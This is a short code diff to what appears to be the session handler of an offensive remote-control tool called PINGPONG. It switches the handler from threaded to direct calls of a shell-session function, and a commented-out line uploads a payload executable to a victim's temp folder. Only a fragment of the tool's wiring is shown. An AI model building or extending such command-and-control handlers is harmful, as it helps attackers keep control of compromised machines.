@@ -4,7 +4,7 @@
 # @Author    :D0WE1L1N
 import random
 import socket
-import threading
+# import threading
 import sys
 import main
 #开启监听
@@ -51,8 +51,9 @@ def startserver(ip, port, printf, open_ac):
         # PINGPONG_script.upload.Upload(_ip, "./payload/upload_payload/PINGPONG_payload.exe", "D:/TEMP", False, False, conn, "")
         if printf:
             main.print_normal('handler>[*]PINGPONG session Created: ' + ip + ":" + str(port) + " >>> " + _ip + ":" + str(_port))
-        t = threading.Thread(target=PINGPONG_shell, args=(conn, ip, port, _ip, str(_port), True, AUTORUNSCRIPT, open_ac))
-        t.start()
+        # t = threading.Thread(target=PINGPONG_shell, args=(conn, ip, port, _ip, str(_port), True, AUTORUNSCRIPT, open_ac))
+        # t.start()
+        PINGPONG_shell(conn, ip, port, _ip, str(_port), True, AUTORUNSCRIPT, open_ac)
 #连接程序
 def PINGPONG_shell(conn, my_ip, my_port, ip, port, printf, AUTOCOMMAND, op_ac):
     #请求发送函数：检查连接
